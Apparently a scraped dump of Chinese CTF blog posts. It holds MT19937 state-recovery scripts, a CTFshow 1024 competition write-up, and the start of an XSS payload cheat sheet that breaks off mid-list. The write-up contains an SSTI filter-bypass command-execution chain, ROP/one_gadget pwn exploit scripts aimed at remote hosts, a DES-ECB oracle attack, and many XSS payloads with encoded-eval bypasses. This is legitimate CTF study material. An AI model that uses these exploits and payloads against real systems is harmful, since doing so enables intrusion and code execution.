tmp = res for i in range(bits // shift): tmp = res ^ tmp &gt;&gt; shift return tmp# right shift with mask inversedef inverse_right_mask(res, shift, mask, bits=32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &gt;&gt; shift &amp; mask return tmp# left shift inversedef inverse_left(res, shift, bits=32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &lt;&lt; shift return tmp# left shift with mask inversedef inverse_left_mask(res, shift, mask, bits=32): tmp = res for i in range(bits // shift): tmp = res ^ tmp &lt;&lt; shift &amp; mask return tmpdef recover(y): y = inverse_right(y,18) y = inverse_left_mask(y,15,4022730752) y = inverse_left_mask(y,7,2636928640) y = inverse_right(y,11) return y&amp;0xffffffffrandom_number = []state = [recover(i) for i in random_number] 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# 脚本2from random import Randomdef invert_right(m,l,val=&#x27;&#x27;): length = 32 mx = 0xffffffff if val == &#x27;&#x27;: val = mx i,res = 0,0 while i*l&lt;length: mask = (mx&lt;&lt;(length-l)&amp;mx)&gt;&gt;i*l tmp = m &amp; mask m = m^tmp&gt;&gt;l&amp;val res += tmp i += 1 return resdef invert_left(m,l,val): length = 32 mx = 0xffffffff i,res = 0,0 while i*l &lt; length: mask = (mx&gt;&gt;(length-l)&amp;mx)&lt;&lt;i*l tmp = m &amp; mask m ^= tmp&lt;&lt;l&amp;val res |= tmp i += 1 return resdef invert_temper(m): m = invert_right(m,18) m = invert_left(m,15,4022730752) m = invert_left(m,7,2636928640) m = invert_right(m,11) return mdef clone_mt(record): state = [invert_temper(i) for i in record] gen = Random() gen.setstate((3,tuple(state+[0]),None)) return genprng = []g = clone_mt(prng[:624])for i in range(700): g.getrandbits(32)key = g.getrandbits(32)print(key) 求前随机数（逆 twist()） 完整 state假设已知该 state 中的 624 个整数，想要知道之前输出的随机数，需要逆转 twist() 得到上一个 state 或者更之前的 state。 12345678910111213141516171819202122232425262728def backtrace(cur): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df state = cur for i in range(623,-1,-1): tmp = state[i]^state[(i+397)%624] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 # recover highest bit res = tmp&amp;high # recover other 31 bits,when i =0,it just use the method again it so beautiful!!!! tmp = state[i-1]^state[(i+396)%624] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res |= (tmp)&amp;low state[i] = res return state 部分 state假设已知 1000 个从开始第 5 个输出的连续随机数，求前 4 个输出的随机数的大小（参考V&amp;N 2020 - backtrace）。 这 1000 个随机数可以分成两段（对应不同的 state 生成的随机数），也就是前 620 个数为第一个 state 生成的，后 380 个数为第二个 state 生成的，需要求第一个 state 生成的前四个随机数。 123456789101112131415161718192021222324def backtrace(cur): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df state = cur for i in range(3,-1,-1): tmp = state[i+624]^state[i+397] # mt&#x27;[i] == mt [i+624] if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res = tmp&amp;high tmp = state[i-1+624]^state[i+396] if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res |= (tmp)&amp;low state[i] = res return state 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# 脚本from random import Random# right shift inversedef inverse_right(res,shift,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &gt;&gt; shift return tmp# right shift with mask inversedef inverse_right_values(res,shift,mask,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp&gt;&gt;shift &amp; mask return tmp# left shift inversedef inverse_left(res,shift,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &lt;&lt; shift return tmp# left shift with mask inversedef inverse_left_values(res,shift,mask,bits=32): tmp = res for i in range(bits//shift): tmp = res ^ tmp &lt;&lt; shift &amp; mask return tmpdef backtrace(cur): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df state = cur for i in range(5,-1,-1): tmp = state[i+624]^state[i+397] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 # recover highest bit res = tmp&amp;high # recover other 31 bits,when i =0,it just use the method again it so beautiful!!!! tmp = state[i-1+624]^state[i+396] # recover Y,tmp = Y if tmp &amp; high == high: tmp ^= mask tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;=1 res |= (tmp)&amp;low state[i] = res return statedef recover_state(out): state = [] for i in out: i = inverse_right(i,18) i = inverse_left_values(i,15,0xefc60000) i = inverse_left_values(i,7,0x9d2c5680) i = inverse_right(i,11) state.append(i) return statec = []partS = recover_state(c)state = backtrace([0]*6+partS)[:624]# print(state)# state[0]不准确，因state[0]==seed，单推# inv = invert(1812433253,1&lt;&lt;32)# seed = inverse_right(((state[1]-1)*inv)%(1&lt;&lt;32),30)# state[0] = int(seed)prng = Random()prng.setstate((3,tuple(state+[0]),None))flag = &quot;flag&#123;&quot; + &#x27;&#x27;.join(str(prng.getrandbits(32)) for _ in range(4)) + &quot;&#125;&quot;print(flag) 求seed（逆 __init__）根据第一次的 state，逆向 seed。 123456789101112131415161718192021222324252627282930from gmpy2 import invertdef _int32(x): return int(0xFFFFFFFF &amp; x)def init(seed): mt = [0] * 624 mt[0] = seed for i in range(1, 624): mt[i] = _int32(1812433253 * (mt[i - 1] ^ mt[i - 1] &gt;&gt; 30) + i) return mtdef invert_right(res,shift): tmp = res for i in range(32//shift): res = tmp^res&gt;&gt;shift return _int32(res)def recover(last): n = 1&lt;&lt;32 inv = invert(1812433253,n) for i in range(623,0,-1): last = ((last-i)*inv)%n last = invert_right(last,30) return lastseed = 2080737669state = init(seed)print(recover(state[-1]) == seed) 参考 浅析MT19937伪随机数生成算法","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"流密码","slug":"流密码","permalink":"https://lazzzaro.github.io/tags/%E6%B5%81%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"CTFshow 1024杯","slug":"match-CTFshow-1024杯","date":"2020-10-25T09:29:24.000Z","updated":"2020-10-28T12:06:19.448Z","comments":true,"path":"2020/10/25/match-CTFshow-1024杯/","link":"","permalink":"https://lazzzaro.github.io/2020/10/25/match-CTFshow-1024%E6%9D%AF/","excerpt":"","text":"​ 比赛：CTFshow 1024杯平台：https://ctf.show开始：2020/10/23 18:00结束：2020/10/25 18:00题目： web 杂项 密码 逆向 pwn 各3道规则：1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：https://wp.ctf.show2 公平竞技，独立比赛3 服务器不要爆破，不要攻击服务器，不要扫描!!!4 奖品：武功秘籍一本，(100元以内) 出题：crypto1+re1 Web1024_WEB签到call_user_func()函数第1个参数为函数名，传入phpinfo 在Configuration中发现不起眼的自定义ctfshow项，内有自定义函数ctfshow_1024 support，传值得flag。 ​ 1024_fastapi页面回显一个JSON数据，了解一下fastapi。 FastAPI 是一个高性能 Web 框架，用于构建 API。 主要特性： 快速：非常高的性能，与 NodeJS 和 Go 相当 快速编码：将功能开发速度提高约 200％ 至 300％ 更少的错误：减少约 40％ 的人为错误 直观：强大的编辑器支持，自动补全无处不在，调试时间更少 简易：旨在易于使用和学习，减少阅读文档的时间。 简短：减少代码重复。 稳健：获取可用于生产环境的代码，具有自动交互式文档 基于标准：基于并完全兼容 API 的开放标准 OpenAPI 和 JSON Schema 发现其自带交互式API文档，访问/docs页，有采用POST方式传参的/cccalccc页，参数q传入计算式得到结果。 因为是python框架，尝试使用SSTI，反复测试各种输入，发现结果为list或string类型的都Internal Server Error或结果为空，尝试将string切片显示，发现成功： str([].__class__.__base__.__subclasses__()[25])[1:] 回显：&#123;&quot;res&quot;:&quot;class &#39;property&#39;&gt;&quot;,&quot;err&quot;:false&#125; 尝试查找warnings.catch_warnings所在下标，以进一步命令执行。爆破下标输出各元素： 1234567import requestsurl=&#x27;http://6aeaea7f-b079-4159-9ac8-d29a4b828174.chall.ctf.show/cccalccc&#x27;for i in range(500): data=&#123;&#x27;q&#x27;:&#x27;str([].__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;])[1:]&#x27;&#125; r=requests.post(url,data) print(r.text) 发现下标189为warnings.catch_warnings，尝试 [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).system(&#39;ls&#39;) 发现过滤了import和system关键字，&#39;import&#39;用&#39;__imp&#39;+&#39;ort__&#39;代替，system用popen代替， 列目录： [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;ls&#39;).read() 根目录无flag文件，单个目录查找flag关键字： [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;find /app | xargs grep flag&#39;).read() 查到结果： &quot;/app/main.py: hint = \\&quot;flag is in /mnt/f1a9,try to read it\\&quot;\\n/app/start.sh:source flag.sh\\n&quot;, 读取拿flag： [].__class__.__base__.__subclasses__()[189].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;os&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;cat /mnt/f1a9&#39;).read() ​ Misc1024_签到 附件地址：https://ctfshow.lanzoui.com/iEuSDhlkxsj 包含很多行x y d text类型的数据，开始以为是Dijkstra算法求最短路径连成flag，跑脚本发现时间复杂度太高 暴力查找，从ag&#123;查找得到的结果，再顺着y值（$y_k$）找以y值开头的x值（$x_{k+1}=y_k$）的行，连接text得flag。 ​ 1024_重新签到 附件：Misc-2-.zip 类三层套娃。 level 1 文件尾提示It&#39;s all numbers，普通爆破无果 出题人提示CRC爆破，压缩包内文件为10字节数字，CRC=0x342F0E5C，10字节CRC爆破： 12345678910from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom binascii import crc32def brute_force(): return bruteforce(lambda x:crc32(x.encode())==int(&#x27;342F0E5C&#x27;,16),string.digits,length=10,method=&#x27;fixed&#x27;)print(brute_force()) 好在设置的数字不大，约1min得结果，为level 2密码。 level 2 jpg图片steghide隐写，解出txt文件，内容：密码是什么呀。 level 3 压缩包注释The password is 32 bits.，结合level 2解出的提示，各种可能的32位md5值都不行，经出题人反复提醒，才知道32是故意留的坑，真正的加密方式是sha（啥），尝试sha1加密什么呀解出flag。 ​ 1024_兔耳 附件地址:https://ctfshow.lanzoui.com/iO0PPhlly5i 带噪音的摩斯密码，而且还很长，不会用脚本去噪+识别，直接硬搞。 内容中必定含flag或FLAG关键字，找到..-. .-.. .- --.特征的一段，接着后面就是flag值。 ​ 1024_非常简单 附件：6.zip + jpg 6.zip 爆破6位数字密码+base92+base64+摩斯密码，得the end。 jpg 分离zip文件，txt中与佛论禅解密得一串数字，结合提示（低头思考/老人机打字）手机键盘解密得zip密码； 第二层zip，txt内容为密文，文件名提示（你怕蛇吗）为Serpent加密，用在线解密网站解密，密钥为6.zip得到的the end，解出为zip密码，打开得flag。 ​ 1024_1024zip套娃 附件：1024.zip 带密码的多层zip套娃，且密码为0124四种数字组成，只能用脚本，生成新的删除旧的。 12345678910111213141516171819202122232425262728import zipfile import osnow = &quot;1024.zip&quot;while 1: print(&quot;~~&quot;+now) zfile = zipfile.ZipFile(now) passFile=open(&#x27;dic.txt&#x27;) #先用0124全排列做字典 for line in passFile.readlines(): try: password = line.strip(&#x27;\\n&#x27;) zfile.extractall(members=zfile.namelist(), pwd=password.encode(&#x27;utf-8&#x27;)) zfile.close() try: os.remove(now) except OSError as e: print(e) names = os.listdir() print(names) for name in names: if name.endswith(&#x27;.zip&#x27;) and name != now: now=name break break except: pass print(&#x27;~~~~&#x27;+now) 解到最终的2048层flag.txt说去看1024层，好在脚本把中间的文件输出且未删除1024.txt文件， hex+hex+b64+b32+hex+b64+hex+b64+hex+b32+b32+hex+b64+zip，得到flag。 ​ 1024_调频收音机 附件地址：https://ctfshow.lanzoui.com/iPAJehln1zc audacity打开，切到频谱图，发现01波形，不会写脚本，把01字符串手撸下来， 尝试按字节分割无果，转成字符串得到包含569a四种字符的字符串，为曼彻斯特编码，脚本解码，得到标准曼彻斯特编码的解码结果为flag。 ​ 1024_大威天龙 送你一句箴言“大威天龙，世尊地藏，般若诸佛，般若巴嘛哄” 修改png高度，发现非文字版与佛论禅，找个在线网站OCR识别文字并检查修正， 修正后，与佛论禅+新与佛论禅+与熊论道+与佛论禅V2，得到flag。 ​ Crypto1024_TrickRSA向+一点数论推导技巧。 $e_1d \\equiv e_2(d+1024) \\equiv 1 \\pmod {\\varphi(n)}$ 即 $(e_1-e_2)d \\equiv 1024e_2 \\pmod {\\varphi(n)}$ 两边乘以 $e_1$ ，有 $(e_1-e_2)e_1d \\equiv 1024e_2e_1 \\pmod {\\varphi(n)}$ 因 $e_1d \\equiv 1 \\pmod {\\varphi(n)}$，则 $e_1-e_2 \\equiv 1024e_2e_1 \\pmod {\\varphi(n)}$ 即 $e_1-e_2-1024e_1e_2 \\equiv 0 \\pmod {\\varphi(n)}$ 即 $e_1-e_2-1024e_1e_2 = k\\varphi(n), k\\in \\mathbb{Z}$ $e_1,e_2$ 已知，可以计算出 $\\varphi(n)$ 的倍数值 $k\\varphi(n)$ 用 $k\\varphi(n)$ 可求出对应的 $d’$值：$e_1d’ \\equiv 1 \\pmod {k\\varphi(n)}$ 联立 $e_1d \\equiv 1 \\pmod {\\varphi(n)}$，有 $d=d’\\pmod {\\varphi(n)}$ 故 $m=c^{d’} \\pmod n$。 12345678910import gmpy2n=e1=e2=enc=kphi = (e1-e2)-1024*e2*e1dd = gmpy2.invert(e1, kphi)msg = pow(enc, dd, n)print(bytes.fromhex(hex(msg)[2:])) ​ 1024_麻辣兔头第七锅 小白兔，白又白，跳出栅栏进锅来 附件：tutu.txt 明显提示的栅栏密码，看到整个密文用普通和W型解都不对， 仔细看密文中只有一对&#123;和&#125;，且&#123;前30个字节内有f/l/a/g四种字母，且间隔相等， 截取f开头到&#125;结尾的字符串，尝试按6位一行取出并观察每行首字母，flag部分为0-f字符，调整第15行之后为5位一行，最后每行首字母连成flag。 ​ 1024_密码系统 1024密码系统，have fun！！！ DES-ECB模式攻击，参考：https://www.jianshu.com/p/8aef410a2eae 整体思路： 由脚本得知为8位分组的DES-ECB加密，每块8位明文单独加密得8位密文，又因key由两种字符串随机选择用于加密，每块8位明文对应的密文有两种可能。 结合脚本观察输出值，是密文 $c$ 经过 $c^{12}+rand(10^{1023},10^{1024})$ 处理的，假设 $c^{12}+rand(10^{1023},10^{1024}) \\lt(c+1)^{12}$ 那么对输出值直接开12次方取整即为 $c$。 明文由输入值m+flag+padding组成，$m$ 为空时， $c$ 可分 $k$ 块，不断调整 $m$ 的长度，直到 $m$ 长度为 $l+1$ 时 $c$ 可分 $k+1$ 块，那么说明 $m$ 长度为 $l$ 时 $c$ 刚好可分 $k$ 块，即无padding情况下，$m+flag$ 可分 $k$ 块，则flag长度即为 $8k-l$。 利用上面的思想，在 $m$ 长度为 $l$ 的基础上，长度不断加1，则可以把flag从后开始的每一位推到下一个块中，得到下一个块的密文 $c_i$； 又已爆破出的flag位+padding已知，则下一个块的构成为未知字符1位+已爆破出的flag位(+padding)； 根据DES-ECB的性质，相同明文块对应的密文块相同。爆破第一位未知字符，将上面的块构成作为输入值输入，得到对应的密文的第一块，分别与实际密文 $c_i$ 比较，匹配的即为正确的明文字符。 以此类推，得到完整flag。 123456789101112131415161718192021222324252627282930313233343536373839#DES-ECB模式运作测试脚本from Crypto.Cipher import DESfrom binascii import b2a_hex, a2b_hexfrom itertools import *import randomimport gmpy2def Encode_1024sys(data,key): data_list = [data[i:i+8] for i in range(0,len(data),8)] print(data_list) k1 = DES.new(key.encode(), DES.MODE_ECB) k2 = DES.new(key[::-1].encode(), DES.MODE_ECB) data_res = &#x27;&#x27; for i in range(0,len(data_list)): k = random.choice([k1,k2]) c = k.encrypt(data_list[i].encode()) data_res += b2a_hex(c).decode() print(b2a_hex(c).decode()) return data_resdef Encode_1024(data,key): len_data=len(data) choices = cycle(&#x27;1024&#x27;) while len_data%8!=0: data += next(choices) len_data=len(data) data_res = Encode_1024sys(data,key) print(data_res) print() data_out = hex(int(data_res,16)**12 + random.randint(10**1023,10**1024))[2:] return data_outmsg=&#x27;*&#x27;*19test_flag=&#x27;10120120414410412041101201204144104120&#x27;test_key=&#x27;messages&#x27;out=Encode_1024(msg+test_flag,test_key)print(out)print()print(hex(gmpy2.iroot(int(out,16),12)[0])) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566#解题脚本from pwn import *import gmpy2import stringhost = &#x27;111.231.70.44&#x27;port = 28045block = 8secret_len = 38ori_padding_len = block-secret_len%blockdef getCliphertext(data): return hex(gmpy2.iroot(int(data,16),12)[0])[2:]p = connect(host,port)dic = &#x27;0124&#x27;padding = [&#x27;1024102&#x27;,&#x27;102410&#x27;,&#x27;10241&#x27;,&#x27;1024&#x27;,&#x27;102&#x27;,&#x27;10&#x27;,&#x27;1&#x27;,&#x27;&#x27;]flag = &#x27;&#x27;for i in range(secret_len): prob=[] find=0 payload = &#x27;*&#x27;*(ori_padding_len+i+1) group = i//block for j in range(20): p.recvuntil(&#x27;&gt; &#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;msg: &#x27;) p.sendline(payload) p.recvuntil(&#x27;is : &#x27;) data = p.recvline() data = getCliphertext(data) print([data[i:i+16] for i in range(0,len(data),16)]) print(data) if group == 0: prob.append(data[-16:]) else: prob.append(data[-16*(group+1):-16*(group+1)+16]) prob=list(set(prob)) print(str(i+1)+&#x27; prob = &#x27;+str(prob)) for j in dic: p.recvuntil(&#x27;&gt; &#x27;) p.sendline(&#x27;1&#x27;) p.recvuntil(&#x27;msg: &#x27;) flag_suffix = flag[:min(len(flag),7)] payload = j + flag_suffix + padding[min(len(flag_suffix),7)] print(payload) p.sendline(payload) p.recvuntil(&#x27;is : &#x27;) data = p.recvline() data = getCliphertext(data) print(data[:16]) if data[:16] in prob: flag = j + flag print(str(i+1)+&#x27; flag = &#x27;+flag) print() find=1 break if find == 0: print(str(i+1)+&#x27; cannot find!&#x27;) break print(flag)#44414440122401244401404424404421440414 最后得到的flag串并不是真正的flag，提示为01248，即云影密码，按0分隔，其他数隔开后组合加和，转化为1-26对应的字母，得到最终flag。 ​ Reverse1024_抽象语言手逆python字节码。源码用python -m dis code.py生成。 字节码还原的相关分析参考： https://docs.python.org/zh-cn/3/library/dis.html https://bbs.pediy.com/thread-262577.htm 得到源码： 1234567891011121314151617181920212223242526272829import base64k = 0_ = 0c = b&quot;...&quot; #base64密文略c = base64.b64decode(c).decode().split(&quot;,&quot;)def x(n): if n &gt; 1: for i in range(2, n): if (n % i) == 0: return False break return True else: return Falsez = lambda n: (2 ** n) - 1out = &#x27;&#x27;while _ &lt; len(c): if x(z(k)): out += chr(int(c[_]) ^ z(k)) _ += 1 k += 1print(out.join([&#x27;flag&#123;&#x27;,&#x27;&#125;&#x27;])) c解出的list与满足函数x()条件的 $2^k-1$ 分别异或得到结果，而x()中判断 $2^k-1$ 是否为素数。 直接运行在短时间只能得到前几位的结果，是因为 $2^k-1$ 的值为指数级增长，而且x()中又需对每个数从2至当前数遍历，非常耗时。 换个角度，c的list长度为47，那么只需寻找前47个满足 $2^k-1$ 为素数的 $k$ 值即可。 参考：梅森素数 梅森数，是指形如 $2^p－1$ 的一类数，其中指数 $p$ 是正整数，常记为 $M_p$ 。如果梅森数是素数，就称为梅森素数。 用因式分解法可以证明，若 $2^n－1$ 是素数，则指数 $n$ 也是素数；反之，当 $n$ 是素数时，$2^n－1$（即$M_p$）却未必是素数。前几个较小的梅森数大都是素数，然而梅森数越大，梅森素数也就越难出现。 目前仅发现51个梅森素数，最大的是 $M_{82589933}$（即 $2^{82589933}-1$），有 $24862048$ 位。 可见满足梅森素数（$2^k-1$）的梅森指数（$k$ 值）必定也是素数，而寻找梅森素数的过程很复杂且极其耗时（发现第35-51个梅森素数的过程，使用巨型分布式算力都花费了近20年）。 对于著名数列，可以使用在线整数数列查询网站（OEIS）查询，梅森素数数列里不足47个，不过可以从梅森指数数列里取47个 $k$ 再计算 $2^k-1$。 12345678910111213141516import base64_ = 0c = b&quot;...&quot; #base64密文略c = base64.b64decode(c).decode().split(&quot;,&quot;)me = [2, 3, 5, 7, 13, 17, 19, 31, 61, 89, 107, 127, 521, 607, 1279, 2203, 2281, 3217, 4253, 4423, 9689, 9941, 11213, 19937, 21701, 23209, 44497, 86243, 110503, 132049, 216091, 756839, 859433, 1257787, 1398269, 2976221, 3021377, 6972593, 13466917, 20996011, 24036583, 25964951, 30402457, 32582657, 37156667, 42643801, 43112609]out = &#x27;&#x27;while _ &lt; len(c): out += chr(int(c[_]) ^ 2**me[_]-1) _ += 1print(out.join([&#x27;flag&#123;&#x27;,&#x27;&#125;&#x27;])) ​ Pwn1024_happy_stack happy为主，顺便签到 无system无/bin/sh无libc。 需要满足s==&#39;36D&#39;，padding填充&#39;36D&#39;.ljust(0x380,&#39;\\x00&#39;)， 可以通过puts函数泄露出puts函数地址，再到libc数据库查找下载相应的libc，用one_gadget找到execve()函数，根据偏移计算基地址，ROP成功。 1234567891011121314151617181920212223242526272829303132from pwn import *p=remote(&#x27;111.231.70.44&#x27;,28058)#p=process(&#x27;./pwn1&#x27;)elf = ELF(&#x27;./pwn1&#x27;)p.recvuntil(&#x27;qunzhu\\n&#x27;)p.recvline()puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]main_addr=elf.symbols[&#x27;main&#x27;]poprdi_addr=0x400803payload=&#x27;36D&#x27;.ljust(0x380,&#x27;\\x00&#x27;)+&#x27;a&#x27;*8+p64(poprdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload)print(p.recvline())p.recvline()puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(puts_addr))#one_gadget libc6_2.27-3ubuntu1_amd64.solibc=ELF(&#x27;./libc6_2.27-3ubuntu1_amd64.so&#x27;)libc_puts=libc.symbols[&#x27;puts&#x27;]libc_execve=libc.symbols[&#x27;execve&#x27;]libc_base=puts_addr-libc_putsexecve_addr=libc_base+0x10a38cpayload=&#x27;36D&#x27;.ljust(0x380,&#x27;\\x00&#x27;)+&#x27;a&#x27;*8+p64(execve_addr)p.sendline(payload)p.interactive() ​ 1024_happy_checkin无system无/bin/sh无libc。 可以通过puts函数泄露出puts函数地址，再到libc数据库查找下载相应的libc，用one_gadget找到execve()函数，根据偏移计算基地址，ROP成功。 123456789101112131415161718192021222324252627282930from pwn import *p=remote(&#x27;111.231.70.44&#x27;,28041)#p=process(&#x27;./pwn2&#x27;)elf = ELF(&#x27;./pwn2&#x27;)p.recvline()puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]main_addr=elf.symbols[&#x27;main&#x27;]poprdi_addr=0x4006e3poprsi_addr=0x4006e1payload=&#x27;a&#x27;*(0x370+8)+p64(poprdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)p.sendline(payload)puts_addr=u64(p.recvuntil(&#x27;\\x7f&#x27;)[-6:].ljust(8,&#x27;\\x00&#x27;))print(hex(puts_addr))#one_gadget libc6_2.27-3ubuntu1_amd64.solibc=ELF(&#x27;./libc6_2.27-3ubuntu1_amd64.so&#x27;)libc_puts=libc.symbols[&#x27;puts&#x27;]libc_execve=libc.symbols[&#x27;execve&#x27;]libc_base=puts_addr-libc_putsexecve_addr=libc_base+0x10a38cpayload=&#x27;a&#x27;*(0x370+8)+p64(execve_addr)p.sendline(payload)p.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"XSS","slug":"web-XSS","date":"2020-10-21T11:47:25.000Z","updated":"2022-03-01T10:39:41.425Z","comments":true,"path":"2020/10/21/web-XSS/","link":"","permalink":"https://lazzzaro.github.io/2020/10/21/web-XSS/","excerpt":"","text":"​ 跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者。 ​ 平台https://xss.pt/xss.php ​ 基本XSS1234567891011121314151617181920212223242526272829303132333435363738Basic payload&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&lt;scr&lt;script&gt;ipt&gt;alert(&#x27;XSS&#x27;)&lt;/scr&lt;script&gt;ipt&gt;&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;Img payload&lt;img src=x onerror=alert(&#x27;XSS&#x27;);&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;)//&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;&lt;img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));&gt;&lt;img src=x:alert(alt) onerror=eval(src) alt=xss&gt;&quot;&gt;&lt;img src=x onerror=alert(&#x27;XSS&#x27;);&gt;&quot;&gt;&lt;img src=x onerror=alert(String.fromCharCode(88,83,83));&gt;Svg payload&lt;svgonload=alert(1)&gt;&lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;&lt;svg onload=alert(1)//&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;&lt;svg id=alert(1) onload=eval(id)&gt;&quot;&gt;&lt;svg/onload=alert(String.fromCharCode(88,83,83))&gt;&quot;&gt;&lt;svg/onload=alert(/XSS/)HTML5中的一些XSS&lt;body onload=alert(/XSS/.source)&gt;&lt;input autofocus onfocus=alert(1)&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;textarea/autofocus/onfocus=alert(1)&gt;&lt;iframe/onload=alert(1)&gt;&lt;/iframe&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;video/poster/onerror=alert(1)&gt;&lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;&lt;video src=_ onloadstart=&quot;alert(1)&quot;&gt;&lt;details/open/ontoggle=&quot;alert`1`&quot;&gt;&lt;audio src onloadstart=alert(1)&gt;&lt;marquee onstart=alert(1)&gt;&lt;meter value=2 min=0 max=10 onmouseover=alert(1)&gt;2 out of 10&lt;/meter&gt; ​ 绕过 JSfuck加密 &lt;script&gt;[JSfuck Code...]&lt;/script&gt; Base64 &lt;script&gt;eval(atob(&quot;[Base64 Code...]&quot;))&lt;/script&gt; ​ Payload集123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525&lt;script&gt;alert(123);&lt;/script&gt;&lt;ScRipT&gt;alert(&quot;XSS&quot;);&lt;/ScRipT&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;script&gt;alert(&quot;hellox worldss&quot;);&lt;/script&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt; &lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&#x27;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;&lt;script&gt;alert(/XSS/)&lt;/script&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;; alert(1);&#x27;)alert(1);//&lt;ScRiPt&gt;alert(1)&lt;/sCriPt&gt;&lt;IMG SRC=jAVasCrIPt:alert(&#x27;XSS&#x27;)&gt;&lt;IMG SRC=&#x27;javascript:alert(&#x27;XSS&#x27;);&#x27;&gt;&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;&lt;IMG SRC=javascript:alert(&#x27;XSS&#x27;)&gt; &lt;img src=xss onerror=alert(1)&gt;&lt;iframe %00 